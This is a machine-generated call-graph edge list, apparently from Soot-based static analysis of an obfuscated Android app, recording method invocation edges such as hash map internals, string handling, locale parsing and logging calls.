VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getKey()>() in <llg: java.lang.Object next()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r3.<lvs: void <init>(java.lang.String,int)>("DOUBLE", 3) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
SPECIAL edge: specialinvoke r0.<hbv: boolean o()>() in <hbv: void k(java.lang.Object,boolean)> ==> <hbv: boolean o()>
SPECIAL edge: specialinvoke $r1.<java.util.NoSuchElementException: void <init>()>() in <lnc: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r2, $r7) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lrg: lsa l()>
SPECIAL edge: specialinvoke r0.<lkx: void <init>()>() in <lkf: void <init>()> ==> <lkx: void <init>()>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i4) in <ljf: int o(int,int,int,int)> ==> <izw: java.lang.Object al(int)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <ltr: java.lang.Object d(lsz)>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(0) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "level") in <lsn: void <init>(java.util.logging.Level)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" component is already registered with a different value.") in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Class: java.lang.String getName()>() in <lwk: int c(java.lang.StackTraceElement[],java.lang.Class,int)> ==> <java.lang.Class: java.lang.String getName()>
STATIC edge: $i6 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int b()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int b()>
SPECIAL edge: specialinvoke $r5.<j$.util.concurrent.k: void <init>(java.lang.Object,java.lang.Object,j$.util.concurrent.ConcurrentHashMap)>($r1, $r2, $r3) in <j$.util.concurrent.d: java.lang.Object next()> ==> <j$.util.concurrent.k: void <init>(java.lang.Object,java.lang.Object,j$.util.concurrent.ConcurrentHashMap)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.util.concurrent.atomic.AtomicInteger: int addAndGet(int)>(-1640531527) in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <java.util.concurrent.atomic.AtomicInteger: int addAndGet(int)>
VIRTUAL edge: $c6 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i5) in <iwt: char[] s(java.lang.String,char,char,int)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>("INSTANCE", 0) in <ldr: void <init>()> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
STATIC edge: $i2 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>(r0) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: lsb B()>() in <lqn: lsa l()> ==> <lkq: lsb B()>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hnq: void <init>()> ==> <iec: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkh: int c()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lkh: int c()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.util.ArrayList: void <init>()>() in <ivv: void <init>()> ==> <java.util.ArrayList: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lta: int hashCode()>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r5) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
STATIC edge: $r1 = staticinvoke <lri: java.lang.Object[] o(java.lang.Object[],int)>($r1, $i0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lri: java.lang.Object[] o(java.lang.Object[],int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r4, $r5) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r4, 0, $r8, 0, $i3) in <lvr: void <init>(lvr,lvr)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r5.<java.lang.String: void <init>(char[],int,int)>($r4, $i1, $i0) in <nzh: boolean f(ivv)> ==> <java.lang.String: void <init>(char[],int,int)>
VIRTUAL edge: $r3 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: java.lang.String getType(android.net.Uri)>(null) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: java.lang.String getType(android.net.Uri)>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.Set: boolean containsAll(java.util.Collection)>($r4) in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <java.util.AbstractCollection: boolean containsAll(java.util.Collection)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqo: lsa l()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
INTERFACE edge: interfaceinvoke $r1.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r3) in <ljd: java.util.Map m()> ==> <java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <ivw: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<lts: java.lang.Object e(int)>($i1) in <lsn: boolean ac()> ==> <lsm: java.lang.Object e(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.util.List asList(java.lang.Object[])>($r1) in <ose: void <clinit>()> ==> <java.util.Arrays: java.util.List asList(java.lang.Object[])>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("Invalid private use tag, other subtag is not empty") in <ivv: int h()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <lri: boolean a(java.util.Comparator,java.lang.Iterable)>($r5, $r9) in <lqs: boolean containsAll(java.util.Collection)> ==> <lri: boolean a(java.util.Comparator,java.lang.Iterable)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljd: int[] w()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $r27 = staticinvoke <java.lang.Float: java.lang.Float valueOf(java.lang.String)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Float: java.lang.Float valueOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hbv: void <init>(java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke r0.<lsc: boolean g(java.util.logging.Level)>($r1) in <lsh: lse h(java.util.logging.Level)> ==> <lsc: boolean g(java.util.logging.Level)>
SPECIAL edge: specialinvoke $r27.<java.lang.AssertionError: void <init>(java.lang.Object)>("Overflow of RecursionDepth (possible error in core library)") in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(4) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lfb: void <init>(lfa)> ==> <java.lang.Object: void <init>()>
CLINIT edge: staticinvoke <gsr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <gsr: void <clinit>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean B(java.lang.String)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean B(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: java.lang.Object h(int)> ==> <ljd: java.lang.Object[] x()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>($r3, $l4, $l5, $l3) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
STATIC edge: $i3 = staticinvoke <ql: int a(int[],int,int)>($r2, $i2, $i0) in <qj: int i(java.lang.Object,int)> ==> <ql: int a(int[],int,int)>
SPECIAL edge: specialinvoke $r1.<bek: void <init>(java.nio.ByteBuffer)>($r0) in <bel: java.io.InputStream a(java.nio.ByteBuffer)> ==> <bek: void <init>(java.nio.ByteBuffer)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: void t(int)> ==> <ljd: int[] w()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lkq: int hashCode()>
SPECIAL edge: specialinvoke $r14.<lkt: void <init>(int)>($i0) in <lmb: lme f()> ==> <lkt: void <init>(int)>
SPECIAL edge: specialinvoke $r2.<lin: void <init>(ldp,lqd)>($r1, r0) in <lqd: lqd d(ldp)> ==> <lin: void <init>(ldp,lqd)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getValue()>
STATIC edge: $i2 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i2) in <lma: int e(int)> ==> <java.lang.Integer: int highestOneBit(int)>
CLINIT edge: staticinvoke <ltf: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ltf: void <clinit>()>
STATIC edge: staticinvoke <iwt: void r(char[],int,int,char,char,int)>($r0, $i0, $i1, 65, 90, 32) in <iwt: void f(char[],int,int)> ==> <iwt: void r(char[],int,int,char,char,int)>
STATIC edge: $r3 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r3, $i0) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>($r2, $r1, 1) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <liy: int size()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(0) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: lsb B()>() in <lqr: lsa l()> ==> <lkq: lsb B()>
INTERFACE edge: $z1 = interfaceinvoke $r0.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lkx: void <init>()>() in <lqq: void <init>(java.lang.Object,java.lang.Object[],int)> ==> <lkx: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r5.<java.util.Iterator: boolean hasNext()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: boolean hasNext()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r0) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)> ==> <java.lang.Object: void <init>()>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int d(java.lang.Class,java.lang.Object,java.lang.Object)>($r7, $r1, $r8) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.ConcurrentHashMap: int d(java.lang.Class,java.lang.Object,java.lang.Object)>
CLINIT edge: staticinvoke <lsh: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsh: void <clinit>()>
SPECIAL edge: specialinvoke $r1.<lsj: void <init>(java.lang.Class)>(class "Ljava/lang/Object;") in <lsl: void <clinit>()> ==> <lsj: void <init>(java.lang.Class)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r9 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: java.lang.Class c(java.lang.Object)>($r1) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Class c(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lsb: void <init>(int,int)>(0, 0) in <lnd: void <init>(java.lang.Object[])> ==> <lsb: void <init>(int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)>($r3, $r1) in <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])> ==> <java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)>
SPECIAL edge: specialinvoke $r0.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <izw: void as(int,java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: int hashCode()>
STATIC edge: $i6 = staticinvoke <izw: int aj(java.lang.Object,int)>($r2, $i5) in <ljd: int z(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<lsz: boolean equals(java.lang.Object)>($r6) in <lsn: boolean ac()> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <llg: java.lang.Object next()> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r5 = virtualinvoke $r7.<lsm: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
INTERFACE edge: $r5 = interfaceinvoke $r1.<ldp: java.lang.Object a(java.lang.Object)>($r4) in <hcb: java.lang.Object l(java.lang.String,ldp)> ==> <hbw: java.lang.Object a(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void a(long,int)>(1L, $i1) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: void a(long,int)>
VIRTUAL edge: r0 = virtualinvoke r0.<lqd: lqd d(ldp)>($r1) in <lqd: lqd c()> ==> <lqd: lqd d(ldp)>
STATIC edge: $r1 = staticinvoke <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])>("%s:%s", $r2) in <hnc: java.lang.String k(java.lang.String,java.lang.String)> ==> <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])>
STATIC edge: staticinvoke <iye: void Q(int,int)>($i1, $i0) in <lsb: void <init>(int,int)> ==> <iye: void Q(int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lqr: int hashCode()>
INTERFACE edge: interfaceinvoke $r3.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r1, $r5) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsq: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r0) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liz: boolean hasNext()>
VIRTUAL edge: $r1 = virtualinvoke $r3.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lak: void <init>(byte[])> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r4.<nzh: boolean f(ivv)>(r0) in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean f(ivv)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <izw: lsa w(java.lang.Object)>($r2) in <lrg: lsa l()> ==> <izw: lsa w(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean F(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean F(java.lang.String)>
STATIC edge: $r0 = staticinvoke <java.util.Collections: java.util.List emptyList()>() in <lvt: void <clinit>()> ==> <java.util.Collections: java.util.List emptyList()>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lnc: java.lang.Object next()>
STATIC edge: staticinvoke <lum: boolean n(java.lang.String,java.util.logging.Level,boolean)>($r2, $r1, $z0) in <lsh: lse h(java.util.logging.Level)> ==> <lum: boolean n(java.lang.String,java.util.logging.Level,boolean)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r4, null) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
SPECIAL edge: specialinvoke $r4.<java.lang.IndexOutOfBoundsException: void <init>()>() in <lsm: lsz c(int)> ==> <java.lang.IndexOutOfBoundsException: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke r0.<ljd: int e()>() in <ljd: int f(java.lang.Object)> ==> <ljd: int e()>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i1, 2) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
STATIC edge: $r29 = staticinvoke <android.util.Base64: byte[] decode(java.lang.String,int)>($r12, 3) in <hbw: java.lang.Object a(java.lang.Object)> ==> <android.util.Base64: byte[] decode(java.lang.String,int)>
STATIC edge: $r2 = staticinvoke <lum: lto d(java.lang.String)>($r0) in <lsh: lsh j(java.lang.String)> ==> <lum: lto d(java.lang.String)>
STATIC edge: $r9 = staticinvoke <java.security.SecureRandom: byte[] getSeed(int)>(8) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.security.SecureRandom: byte[] getSeed(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $i0 = staticinvoke <kwe: int U(int,int,int)>($i0, 1, 1073741823) in <ljd: void q(int)> ==> <kwe: int U(int,int,int)>
VIRTUAL edge: $l3 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: long l()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: long l()>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean v()>() in <ljd: int b()> ==> <ljd: boolean v()>
SPECIAL edge: specialinvoke $r0.<ljd: void <init>()>() in <ljd: ljd g()> ==> <ljd: void <init>()>
STATIC edge: $z0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r5, $i2, $r4) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
STATIC edge: $r2 = staticinvoke <hnc: java.lang.String k(java.lang.String,java.lang.String)>($r2, $r3) in <hnc: java.lang.String d(hmm)> ==> <hnc: java.lang.String k(java.lang.String,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean isEmpty()>() in <ljd: int c()> ==> <ljd: boolean isEmpty()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $r1 = virtualinvoke $r7.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
INTERFACE edge: $r5 = interfaceinvoke $r0.<java.util.Map: java.lang.Object get(java.lang.Object)>($r2) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>($r2) in <miv: void <clinit>()> ==> <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lkh: java.lang.Object[] n()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: java.lang.Object[] n()>
INTERFACE edge: $r9 = interfaceinvoke $r7.<java.util.Map$Entry: java.lang.Object getKey()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r8.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <lvr: void <init>(java.util.List)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r2, $r3) in <ljb: void a()> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.util.ConcurrentModificationException: void <init>()>() in <lje: void a()> ==> <java.util.ConcurrentModificationException: void <init>()>
VIRTUAL edge: $r12 = virtualinvoke $r2.<ivv: ivw a()>() in <ivw: ivw d(java.util.Locale)> ==> <ivv: ivw a()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <liz: void <init>(ljd)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <ivw: ivw g(java.lang.String)>($r0) in <ivw: ivw f(java.lang.String)> ==> <ivw: ivw g(java.lang.String)>
SPECIAL edge: specialinvoke $r10.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_CATEGORY_METADATA", 10, 10) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean O(char)>($c0) in <ivw: boolean u(char)> ==> <ivw: boolean O(char)>
VIRTUAL edge: $r5 = virtualinvoke r0.<lli: java.util.Collection b()>() in <lli: void e(java.lang.Object,java.lang.Object)> ==> <lmb: java.util.Collection b()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lje: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r4.<hbv: boolean m(java.lang.Object)>($r1) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <hbv: boolean m(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hny: void <init>(ivw,java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r3.<java.lang.String: int indexOf(int)>(95) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: int indexOf(int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: int hashCode()>
